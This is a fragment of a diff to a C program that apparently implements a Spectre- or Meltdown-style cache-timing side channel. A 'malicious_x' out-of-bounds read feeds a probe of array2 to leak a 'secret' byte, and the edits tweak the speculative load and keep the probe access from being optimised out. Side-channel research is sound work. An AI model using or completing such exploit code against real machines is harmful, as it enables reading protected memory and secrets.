@@ -81,11 +81,14 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
     for (j = 29; j >= 0; j--) {
         for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
         
-        addr = &bigArray[malicious_x];
         secret[0] = 'q';
-        data = *addr;
+        data = bigArray[malicious_x];
         //Now the data from bigArray[0] is supposed to temporarily be in (data) so we will access this point
-        temp &= array2[data * 512];
+        temp = array2[data * 512] & j;
+        if (temp == 12) {
+            printf("%d   %d\n", j, array2[data * 512]);
+        }; //Use temp so that it will not be optimized out
+
     }
 
     //Now we accessed the point in the memory that is correlated with the data in big[0]
@@ -165,7 +168,7 @@ int main(int argc, const char * * argv) {
   bigArray[distanceFromCurrentAddressToDesiredAddress] = 'N';
 
   printf("Malicious x is %zu\n", distanceFromCurrentAddressToDesiredAddress);
-  printf("Address in bigArray is %p\n", addr);
+  printf("Address of bigArray is %p\n", addr);
   printf("Address of the secret is %p\n", secret);
   while (--len >= 0) {
     printf("\n");
